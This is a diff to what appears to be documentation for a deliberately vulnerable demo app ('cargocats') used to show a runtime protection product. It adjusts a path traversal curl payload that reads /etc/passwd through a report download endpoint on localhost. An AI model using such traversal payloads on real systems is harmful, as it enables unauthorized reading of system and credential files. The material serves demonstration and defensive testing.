@@ -582,7 +582,7 @@ Returns the seeded plain-text report for that shipment.
 
 **Exploit payload:**
 ```bash
-curl 'http://cargocats.localhost/api/tracking-report/download?file=../../../../etc/passwd'
+curl 'http://cargocats.localhost/api/tracking-report/download?file=../../../../../etc/passwd'
 ```
 
 With Contrast Protect **disabled**, returns the contents of `/etc/passwd`.
